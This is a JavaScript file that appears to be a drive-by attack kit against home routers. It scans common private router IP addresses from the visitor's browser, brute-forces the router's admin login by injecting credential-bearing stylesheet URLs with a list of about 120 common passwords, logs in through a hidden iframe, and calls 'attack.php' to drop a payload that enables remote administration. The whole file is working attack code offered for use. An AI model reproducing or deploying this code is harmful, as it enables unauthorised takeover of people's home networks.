//Settings
victim = "192.168.1.1";
user = "admin";

//Dont touch these
count = 1;
enabled = false;
payload = false;
passFound = 0;

//Password Array
pass = new Array("","admin","password","1234","netgear1","netgear","optimum","password","test","linksys","tech","123456","123456","password","123456789","welcome","ninja","abc123","qwerty","12345678","princess","sunshine","iloveyou","welcome","jesus","babygirl","12345","rockyou","Nichole","Daniel","money","monkey","freedom","654321","michael","1234567","love","master","ginger","11111","1234","dragon","batman","baseball","buster","starwars","dallas","summer","access","killer","mustang","2000","soccer","ranger","696969","tigger","pass","shadow","Jennifer","letmein","Joshua","merlin","Robert","hockey","666666","orange","jordan","trustno1","superman","computer","123123","thunder","internet","lifehack","0","gizmodo","whatever","cheese","nintendo","f You","blahblah","passwOrd","gawker","Password","pokemon","michelle","pepper","kotaku","F#ck","P#ssy","6969","1111","a##hole","golfer","austin","biteme","cowboy","silver","F#cker","bigdog","bl#wjob","yellow","131313","hello","please","scooter","dick","iwantu","sexy","panties","hammer","yankees");
var length = pass.length,
element = null;

function crackPass() {
	for (var i = 0; i < length; i++) {
		if(passFound == 0) {
			password = pass[i];
			jQuery('head').append('<link rel="stylesheet" onload="logPW(\'' + password + '\')" href="http://admin:' + password + '@' + victim + '" type="text/css" />');
		}
	}
}

function logPW(password) {
	if(passFound == 0) {
		alert("Your Router Passowrd is: " + password);
		//Log Into Router
		var iframe = document.getElementById("loginFrame");
		setTimeout(function() { iframe.src = "http://" + user + ":" + password + "@" + victim; }, 500);
		setTimeout(function() { window.location = "http://" + victim; }, 2000);
	}
	passFound = 1;
}


//Deploy Malicous Payload to Router (Enable Remote Administration)
function dropLoad(){
	var iframe = document.getElementById("loginFrame");
	setTimeout(function() {  iframe.src = "attack.php?ip=" + victim; }, 100);
	console.log("dropping payload");
}

//Enumeration Module Used to Discover Router Local IP Address
iplist = new Array("192.168.1.1","10.0.1.1","10.0.0.1","192.168.1.220","192.168.2.1","10.1.1.1","192.168.11.1","192.168.0.1","192.168.0.30","192.168.0.50","192.168.1.30","192.168.1.50","192.168.10.1","192.168.20.1","192.168.30.1","192.168.62.1","192.168.100.1","192.168.102.1","192.168.1.254","192.168.0.227","10.0.0.138","192.168.123.254","192.168.4.1","10.0.0.2");
counter = 0;
 
function enumerateRouter() {
   if(counter !== iplist.length){
        var ip = iplist[counter];
        counter++;
	} else {
		return false;
	}
	
	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = function () {
		if (xhr.readyState == 4 && xhr.status == 200) {
			//alert("success");
		}
	};

	xhr.open("POST", "http://" + ip, true);
	xhr.setRequestHeader("Content-type", "application/json; charset=utf-8");
	xhr.timeout = 1000;
	xhr.ontimeout = function () { console.log(ip + " FAIL"); enumerateRouter(); }
	xhr.onerror = function () { console.log(ip + " MATCH"); victim = ip; crackPass();  }
	xhr.send();
}